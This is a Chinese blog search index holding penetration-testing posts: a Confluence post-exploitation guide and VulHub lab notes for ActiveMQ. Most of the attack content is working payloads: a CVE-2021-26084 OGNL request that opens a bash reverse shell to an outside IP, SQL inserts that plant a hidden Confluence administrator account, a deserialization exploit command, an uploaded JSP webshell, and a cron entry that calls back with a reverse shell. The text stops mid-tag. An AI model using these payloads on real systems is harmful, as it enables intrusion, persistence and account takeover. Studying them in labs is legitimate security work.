<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Confluence后利用</title>
      <link href="/2024/11/08/Confluence%E5%90%8E%E5%88%A9%E7%94%A8/"/>
      <url>/2024/11/08/Confluence%E5%90%8E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="获取权限"><a href="#获取权限" class="headerlink" title="获取权限"></a>获取权限</h1><p>CVE拿到服务器权限。</p><h2 id="CVE-2021-26084-Confluence远程代码执行漏洞"><a href="#CVE-2021-26084-Confluence远程代码执行漏洞" class="headerlink" title="CVE-2021-26084 Confluence远程代码执行漏洞"></a>CVE-2021-26084 Confluence远程代码执行漏洞</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/pages/doenterpagevariables.action</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>host</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>curl/8.9.1</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1328</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-llvm">queryString<span class="operator">=</span><span class="variable">%5</span>Cu<span class="number">0027</span><span class="variable">%2</span>B<span class="variable">%7</span>BClass<span class="variable">%2</span>EforName<span class="variable">%28</span><span class="variable">%5</span>Cu<span class="number">0027</span>javax<span class="variable">%2</span>Escript<span class="variable">%2</span>EScriptEngineManager<span class="variable">%5</span>Cu<span class="number">0027</span><span class="variable">%29</span><span class="variable">%2</span>EnewInstance<span class="variable">%28</span><span class="variable">%29</span><span class="variable">%2</span>EgetEngineByName<span class="variable">%28</span><span class="variable">%5</span>Cu<span class="number">0027</span>JavaScript<span class="variable">%5</span>Cu<span class="number">0027</span><span class="variable">%29</span><span class="variable">%2</span>E<span class="variable">%5</span>Cu<span class="number">0065</span>val<span class="variable">%28</span><span class="variable">%5</span>Cu<span class="number">0027</span>var<span class="variable">%20</span>isWin<span class="variable">%20</span><span class="variable">%3</span>D<span class="variable">%20</span>java<span class="variable">%2</span>Elang<span class="variable">%2</span>ESystem<span class="variable">%2</span>EgetProperty<span class="variable">%28</span><span class="variable">%5</span>Cu<span class="number">0022</span>os<span class="variable">%2</span>Ename<span class="variable">%5</span>Cu<span class="number">0022</span><span class="variable">%29</span><span class="variable">%2</span>EtoLowerCase<span class="variable">%28</span><span class="variable">%29</span><span class="variable">%2</span>Econtains<span class="variable">%28</span><span class="variable">%5</span>Cu<span class="number">0022</span>win<span class="variable">%5</span>Cu<span class="number">0022</span><span class="variable">%29</span><span class="variable">%3</span>B<span class="variable">%20</span>var<span class="variable">%20</span>cmd<span class="variable">%20</span><span class="variable">%3</span>D<span class="variable">%20</span>new<span class="variable">%20</span>java<span class="variable">%2</span>Elang<span class="variable">%2</span>EString<span class="variable">%28</span><span class="variable">%5</span>Cu<span class="number">0022</span>bash<span class="variable">%20</span><span class="variable">%5</span>Cu<span class="number">002</span>Di<span class="variable">%20</span><span class="variable">%5</span>Cu<span class="number">003</span>E<span class="variable">%5</span>Cu<span class="number">0026</span><span class="variable">%20</span><span class="variable">%2</span>Fdev<span class="variable">%2</span>Ftcp<span class="variable">%2</span>F<span class="number">192</span><span class="variable">%2</span>E<span class="number">168</span><span class="variable">%2</span>E<span class="number">1</span><span class="variable">%2</span>E<span class="number">1</span><span class="variable">%2</span>F<span class="number">8085</span><span class="variable">%200</span><span class="variable">%5</span>Cu<span class="number">003</span>E<span class="variable">%5</span>Cu<span class="number">00261</span><span class="variable">%5</span>Cu<span class="number">0022</span><span class="variable">%29</span><span class="variable">%3</span>Bvar<span class="variable">%20</span>p<span class="variable">%20</span><span class="variable">%3</span>D<span class="variable">%20</span>new<span class="variable">%20</span>java<span class="variable">%2</span>Elang<span class="variable">%2</span>EProcessBuilder<span class="variable">%28</span><span class="variable">%29</span><span class="variable">%3</span>B<span class="variable">%20</span>if<span class="variable">%28</span>isWin<span class="variable">%29</span><span class="variable">%7</span>Bp<span class="variable">%2</span>Ecommand<span class="variable">%28</span><span class="variable">%5</span>Cu<span class="number">0022</span>cmd<span class="variable">%2</span>Eexe<span class="variable">%5</span>Cu<span class="number">0022</span><span class="variable">%2</span>C<span class="variable">%20</span><span class="variable">%5</span>Cu<span class="number">0022</span><span class="variable">%2</span>Fc<span class="variable">%5</span>Cu<span class="number">0022</span><span class="variable">%2</span>C<span class="variable">%20</span>cmd<span class="variable">%29</span><span class="variable">%3</span>B<span class="variable">%20</span><span class="variable">%7</span>D<span class="variable">%20</span>else<span class="variable">%7</span>Bp<span class="variable">%2</span>Ecommand<span class="variable">%28</span><span class="variable">%5</span>Cu<span class="number">0022</span>bash<span class="variable">%5</span>Cu<span class="number">0022</span><span class="variable">%2</span>C<span class="variable">%20</span><span class="variable">%5</span>Cu<span class="number">0022</span><span class="variable">%2</span>Dc<span class="variable">%5</span>Cu<span class="number">0022</span><span class="variable">%2</span>C<span class="variable">%20</span>cmd<span class="variable">%29</span><span class="variable">%3</span>B<span class="variable">%20</span><span class="variable">%7</span>Dp<span class="variable">%2</span>EredirectErrorStream<span class="variable">%28</span><span class="keyword">true</span><span class="variable">%29</span><span class="variable">%3</span>B<span class="variable">%20</span>var<span class="variable">%20</span>process<span class="variable">%3</span>D<span class="variable">%20</span>p<span class="variable">%2</span>Estart<span class="variable">%28</span><span class="variable">%29</span><span class="variable">%3</span>B<span class="variable">%20</span>var<span class="variable">%20</span>inputStreamReader<span class="variable">%20</span><span class="variable">%3</span>D<span class="variable">%20</span>new<span class="variable">%20</span>java<span class="variable">%2</span>Eio<span class="variable">%2</span>EInputStreamReader<span class="variable">%28</span>process<span class="variable">%2</span>EgetInputStream<span class="variable">%28</span><span class="variable">%29</span><span class="variable">%29</span><span class="variable">%3</span>B<span class="variable">%20</span>var<span class="variable">%20</span>bufferedReader<span class="variable">%20</span><span class="variable">%3</span>D<span class="variable">%20</span>new<span class="variable">%20</span>java<span class="variable">%2</span>Eio<span class="variable">%2</span>EBufferedReader<span class="variable">%28</span>inputStreamReader<span class="variable">%29</span><span class="variable">%3</span>B<span class="variable">%20</span>var<span class="variable">%20</span>line<span class="variable">%20</span><span class="variable">%3</span>D<span class="variable">%20</span><span class="variable">%5</span>Cu<span class="number">0022</span><span class="variable">%5</span>Cu<span class="number">0022</span><span class="variable">%3</span>B<span class="variable">%20</span>var<span class="variable">%20</span>output<span class="variable">%20</span><span class="variable">%3</span>D<span class="variable">%20</span><span class="variable">%5</span>Cu<span class="number">0022</span><span class="variable">%5</span>Cu<span class="number">0022</span><span class="variable">%3</span>B<span class="variable">%20</span>while<span class="variable">%28</span><span class="variable">%28</span>line<span class="variable">%20</span><span class="variable">%3</span>D<span class="variable">%20</span>bufferedReader<span class="variable">%2</span>EreadLine<span class="variable">%28</span><span class="variable">%29</span><span class="variable">%29</span><span class="variable">%20</span><span class="variable">%21</span><span class="variable">%3</span>D<span class="variable">%20</span><span class="keyword">null</span><span class="variable">%29</span><span class="variable">%7</span>Boutput<span class="variable">%20</span><span class="variable">%3</span>D<span class="variable">%20</span>output<span class="variable">%20</span><span class="variable">%2</span>B<span class="variable">%20</span>line<span class="variable">%20</span><span class="variable">%2</span>B<span class="variable">%20</span>java<span class="variable">%2</span>Elang<span class="variable">%2</span>ECharacter<span class="variable">%2</span>EtoString<span class="variable">%2810</span><span class="variable">%29</span><span class="variable">%3</span>B<span class="variable">%20</span><span class="variable">%7</span>D<span class="variable">%5</span>Cu<span class="number">0027</span><span class="variable">%29</span><span class="variable">%7</span>D<span class="variable">%2</span>B<span class="variable">%5</span>Cu<span class="number">0027</span></span></span><br></pre></td></tr></table></figure><p>修改host为目标，内容url解码以后修改为自己vps的ip和port。<br>升级哑shell编程交互式shell：<br>打开vps，输入exec bash<br>输入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>按下 <code>ctrl-z</code><br>VPS终端中输入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span> <span class="comment"># 关闭输入显示</span></span><br><span class="line"><span class="built_in">fg</span> <span class="comment"># 会没有显示</span></span><br></pre></td></tr></table></figure><p>最后在获取到的目标机的shell输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export SHELL=bash &amp;&amp; export TERM=xterm-256color &amp;&amp; stty rows 31 columns 134 &amp;&amp; reset</span><br></pre></td></tr></table></figure><p>即可获取完整的交互式shell。</p><h1 id="获取数据库权限"><a href="#获取数据库权限" class="headerlink" title="获取数据库权限"></a>获取数据库权限</h1><p>默认路径为：/var/atlassian/application-data/confluence/confluence.cfg.xml<br>若无则用 find / -name “confluence.cfg.xml”<br><img src="https://cdn.jsdelivr.net/gh/Fpointzero/Img@main/img/202410291707367.png" alt="image.png"><br>或者采用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /opt/atlassian/confluence/confluence/WEB-INF/classes/confluence-init.properties | grep confluence.home`</span><br></pre></td></tr></table></figure><h1 id="获取Confluence权限"><a href="#获取Confluence权限" class="headerlink" title="获取Confluence权限"></a>获取Confluence权限</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> u.id, u.user_name, u.active <span class="keyword">from</span> cwd_user u <span class="keyword">join</span> cwd_membership m <span class="keyword">on</span> u.id<span class="operator">=</span>m.child_user_id <span class="keyword">join</span> cwd_group g <span class="keyword">on</span> m.parent_id<span class="operator">=</span>g.id <span class="keyword">join</span> cwd_directory d <span class="keyword">on</span> d.id<span class="operator">=</span>g.directory_id <span class="keyword">where</span> g.group_name <span class="operator">=</span> <span class="string">&#x27;confluence-administrators&#x27;</span> <span class="keyword">and</span> d.directory_name<span class="operator">=</span><span class="string">&#x27;Confluence Internal Directory&#x27;</span>;</span><br></pre></td></tr></table></figure><p>插入数据库管理员账号和密码 (用户名adm1n，密码admin)，关注id是否重复。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> cwd_user(id, user_name, lower_user_name, active, created_date, updated_date, first_name, lower_first_name, last_name, lower_last_name, display_name, lower_display_name, email_address, lower_email_address, directory_id, credential) <span class="keyword">values</span> (<span class="number">1212121</span>, <span class="string">&#x27;adm1n&#x27;</span>, <span class="string">&#x27;adm1n&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;2009-11-26 17:42:08&#x27;</span>, <span class="string">&#x27;2009-11-26 17:42:08&#x27;</span>, <span class="string">&#x27;A. D.&#x27;</span>, <span class="string">&#x27;a. d.&#x27;</span>, <span class="string">&#x27;Ministrator&#x27;</span>, <span class="string">&#x27;ministrator&#x27;</span>, <span class="string">&#x27;A. D. Ministrator&#x27;</span>, <span class="string">&#x27;a. d. ministrator&#x27;</span>, <span class="string">&#x27;admin@example.com&#x27;</span>, <span class="string">&#x27;admin@example.com&#x27;</span>, (<span class="keyword">select</span> id <span class="keyword">from</span> cwd_directory <span class="keyword">where</span> directory_name<span class="operator">=</span><span class="string">&#x27;Confluence Internal Directory&#x27;</span>), <span class="string">&#x27;x61Ey612Kl2gpFL56FT9weDnpSo4AV8j8+qx2AuTHdRyY036xxzTTrw10Wq3+4qQyB+XURPWx1ONxp3Y3pB37A==&#x27;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> user_mapping <span class="keyword">values</span> (<span class="string">&#x27;2c9681954172cf560000000000000001&#x27;</span>, <span class="string">&#x27;adm1n&#x27;</span>, <span class="string">&#x27;adm1n&#x27;</span>);</span><br></pre></td></tr></table></figure><p>若是不存在confluence-administrators和confluence-users组，这还需要插入组。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 插入confluence-administrators</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> cwd_group(id, group_name, lower_group_name, active, <span class="keyword">local</span>, created_date, updated_date, description, group_type, directory_id)  </span><br><span class="line"><span class="keyword">values</span> ( <span class="string">&#x27;888888&#x27;</span>,<span class="string">&#x27;confluence-administrators&#x27;</span>,<span class="string">&#x27;confluence-administrators&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;2011-03-21 12:20:29&#x27;</span>,<span class="string">&#x27;2011-03-21 12:20:29&#x27;</span>,<span class="keyword">NULL</span>,<span class="string">&#x27;GROUP&#x27;</span>,(<span class="keyword">select</span> id <span class="keyword">from</span> cwd_directory <span class="keyword">where</span> directory_name<span class="operator">=</span><span class="string">&#x27;Confluence Internal Directory&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 插入confluence-users</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> cwd_group(id, group_name, lower_group_name, active, <span class="keyword">local</span>, created_date, updated_date, description, group_type, directory_id)  </span><br><span class="line"><span class="keyword">values</span> ( <span class="string">&#x27;999999&#x27;</span>,<span class="string">&#x27;confluence-users&#x27;</span>,<span class="string">&#x27;confluence-users&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;2011-03-21 12:20:29&#x27;</span>,<span class="string">&#x27;2011-03-21 12:20:29&#x27;</span>,<span class="keyword">NULL</span>,<span class="string">&#x27;GROUP&#x27;</span>,(<span class="keyword">select</span> id <span class="keyword">from</span> cwd_directory <span class="keyword">where</span> directory_name<span class="operator">=</span><span class="string">&#x27;Confluence Internal Directory&#x27;</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后新增adm1n到管理组（与前面组id要一致）。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 1</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> cwd_membership (id, parent_id, child_user_id) <span class="keyword">values</span> (<span class="number">888888</span>, (<span class="keyword">select</span> id <span class="keyword">from</span> cwd_group <span class="keyword">where</span> group_name<span class="operator">=</span><span class="string">&#x27;confluence-users&#x27;</span> <span class="keyword">and</span> directory_id<span class="operator">=</span>(<span class="keyword">select</span> id <span class="keyword">from</span> cwd_directory <span class="keyword">where</span> directory_name<span class="operator">=</span><span class="string">&#x27;Confluence Internal Directory&#x27;</span>)), <span class="number">1212121</span>);  </span><br><span class="line"><span class="comment">-- 2</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> cwd_membership (id, parent_id, child_user_id) <span class="keyword">values</span> (<span class="number">999999</span>, (<span class="keyword">select</span> id <span class="keyword">from</span> cwd_group <span class="keyword">where</span> group_name<span class="operator">=</span><span class="string">&#x27;confluence-administrators&#x27;</span> <span class="keyword">and</span> directory_id<span class="operator">=</span>(<span class="keyword">select</span> id <span class="keyword">from</span> cwd_directory <span class="keyword">where</span> directory_name<span class="operator">=</span><span class="string">&#x27;Confluence Internal Directory&#x27;</span>)), <span class="number">1212121</span>);</span><br></pre></td></tr></table></figure><p>最后使用adm1n/admin登录进入系统。</p>]]></content>
      
      
      <categories>
          
          <category> 知识学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulHub靶场积累</title>
      <link href="/2024/03/30/VulHub%E9%9D%B6%E5%9C%BA%E7%A7%AF%E7%B4%AF/"/>
      <url>/2024/03/30/VulHub%E9%9D%B6%E5%9C%BA%E7%A7%AF%E7%B4%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="Activemq"><a href="#Activemq" class="headerlink" title="Activemq"></a>Activemq</h1><p>Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。</p><p>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。</p><p>fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：</p><ol><li>其使用率并不高</li><li>文件操作容易出现漏洞</li></ol><p>所以，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。</p><p>在测试过程中，可以关注ActiveMQ的版本，避免走弯路。</p><h2 id="ActiveMQ-反序列化漏洞（CVE-2015-5254）"><a href="#ActiveMQ-反序列化漏洞（CVE-2015-5254）" class="headerlink" title="ActiveMQ 反序列化漏洞（CVE-2015-5254）"></a>ActiveMQ 反序列化漏洞（CVE-2015-5254）</h2><blockquote><p>Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。</p><p>环境运行后，将监听61616和8161两个端口。其中61616是工作端口，消息在这个端口进行传递；8161是Web管理页面端口。访问<code>http://your-ip:8161</code>即可看到web管理页面，不过这个漏洞理论上是不需要web的。</p></blockquote><p>漏洞利用过程如下：</p><ol><li>构造（可以使用ysoserial）可执行命令的序列化对象</li><li>作为一个消息，发送给目标61616端口</li><li>访问web管理页面，读取消息，触发漏洞</li></ol><p>使用<a href="https://github.com/matthiaskaiser/jmet">jmet</a>进行漏洞利用。首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。</p><p>jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/success&quot; -Yp ROME your-ip 61616</span><br></pre></td></tr></table></figure><p><img src="/2024/03/30/VulHub%E9%9D%B6%E5%9C%BA%E7%A7%AF%E7%B4%AF/image-20240329185824765.png" alt="image-20240329185824765"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.116.129:8161/admin/browse.jsp?JMSDestination=event</span><br></pre></td></tr></table></figure><p>登录对应的管理面板点击对应的消息队列</p><p><img src="/2024/03/30/VulHub%E9%9D%B6%E5%9C%BA%E7%A7%AF%E7%B4%AF/image-20240329190358933.png" alt="image-20240329190358933"></p><p>在docker环境下查看，成功创建了文件，说明执行shell成功了</p><p><img src="/2024/03/30/VulHub%E9%9D%B6%E5%9C%BA%E7%A7%AF%E7%B4%AF/image-20240329190057176.png" alt="image-20240329190057176"></p><h2 id="ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><a href="#ActiveMQ任意文件写入漏洞（CVE-2016-3088）" class="headerlink" title="ActiveMQ任意文件写入漏洞（CVE-2016-3088）"></a>ActiveMQ任意文件写入漏洞（CVE-2016-3088）</h2><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>ActiveMQ &lt; 5.12.x</p><p>ActiveMQ在<strong>5.12.x~5.13.x</strong>版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。</p><h3 id="背景简述"><a href="#背景简述" class="headerlink" title="背景简述"></a>背景简述</h3><blockquote><p>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。</p><p>fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：</p><ol><li>其使用率并不高</li><li>文件操作容易出现漏洞</li></ol><p>所以，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。</p><p>在测试过程中，可以关注ActiveMQ的版本，避免走弯路。</p></blockquote><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="1、写入webshell"><a href="#1、写入webshell" class="headerlink" title="1、写入webshell"></a>1、写入webshell</h4><p>​    默认的ActiveMQ账号密码均为<code>admin</code>，首先访问<code>http://your-ip:8161/admin/test/systemProperties.jsp</code>，查看ActiveMQ的绝对路径：</p><p><img src="/2024/03/30/VulHub%E9%9D%B6%E5%9C%BA%E7%A7%AF%E7%B4%AF/image-20240330173016707.png" alt="image-20240330173016707"></p><p>​    然后利用fileserver传入webshell（请求返回204则成功）</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/fileserver/2.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8161</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>862</span><br><span class="line"></span><br><span class="line"><span class="language-reasonml">&lt;%@ page import=<span class="string">&quot;java.util.*,java.io.*&quot;</span>%&gt;</span></span><br><span class="line"><span class="language-reasonml">&lt;%</span></span><br><span class="line"><span class="language-reasonml"><span class="keyword">if</span> (request.get<span class="constructor">Parameter(<span class="string">&quot;cmd&quot;</span>)</span> != null) &#123;</span></span><br><span class="line"><span class="language-reasonml">        out.println(<span class="string">&quot;Command: &quot;</span> + request.get<span class="constructor">Parameter(<span class="string">&quot;cmd&quot;</span>)</span> + <span class="string">&quot;&lt;BR&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-reasonml">        Process p = <span class="module-access"><span class="module"><span class="identifier">Runtime</span>.</span></span>get<span class="constructor">Runtime()</span>.exec(request.get<span class="constructor">Parameter(<span class="string">&quot;cmd&quot;</span>)</span>);</span></span><br><span class="line"><span class="language-reasonml">        OutputStream os = p.get<span class="constructor">OutputStream()</span>;</span></span><br><span class="line"><span class="language-reasonml">        InputStream <span class="keyword">in</span> = p.get<span class="constructor">InputStream()</span>;</span></span><br><span class="line"><span class="language-reasonml">        DataInputStream dis = <span class="keyword">new</span> <span class="constructor">DataInputStream(<span class="params">in</span>)</span>;</span></span><br><span class="line"><span class="language-reasonml">        String disr = dis.read<span class="constructor">Line()</span>;</span></span><br><span class="line"><span class="language-reasonml">        <span class="keyword">while</span> ( disr != null ) &#123;</span></span><br><span class="line"><span class="language-reasonml">                out.println(disr); </span></span><br><span class="line"><span class="language-reasonml">                disr = dis.read<span class="constructor">Line()</span>; </span></span><br><span class="line"><span class="language-reasonml">                &#125;</span></span><br><span class="line"><span class="language-reasonml">        &#125;</span></span><br><span class="line"><span class="language-reasonml">%&gt;</span></span><br><span class="line"><span class="language-reasonml"></span></span><br><span class="line"><span class="language-reasonml"></span></span><br></pre></td></tr></table></figure><p>将上传的webshell移动到activemq的对应api目录下面</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">MOVE</span> <span class="string">/fileserver/2.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Destination</span><span class="punctuation">: </span>file:///opt/activemq/webapps/api/s.jsp</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8161</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2024/03/30/VulHub%E9%9D%B6%E5%9C%BA%E7%A7%AF%E7%B4%AF/image-20240330174207784.png" alt="image-20240330174207784"></p><h4 id="2、写入任务计划，自动化反弹shell"><a href="#2、写入任务计划，自动化反弹shell" class="headerlink" title="2、写入任务计划，自动化反弹shell"></a>2、写入任务计划，自动化反弹shell</h4><p>前提：root权限</p><h5 id="系统级crontab"><a href="#系统级crontab" class="headerlink" title="系统级crontab"></a>系统级crontab</h5><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/fileserver/1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8161</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>247</span><br><span class="line"></span><br><span class="line"><span class="language-arcade">*<span class="regexp">/1 * * * * root /</span>bin/bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;</span></span></span><br><span class="line"><span class="language-arcade"></span></span><br></pre></td></tr></table></figure><p>​    记得最后的一定要是\n而不是\r\n否则会失败（复现的时候卡这里很久）</p><p><img src="/2024/03/30/VulHub%E9%9D%B6%E5%9C%BA%E7%A7%AF%E7%B4%AF/image-20240330194738719.png" alt="image-20240330194738719"></p><p>​    然后写入</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">MOVE</span> <span class="string">/fileserver/1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Destination</span><span class="punctuation">: </span>file:///etc/cron.d/root</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8161</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​    等待反弹</p><p><img 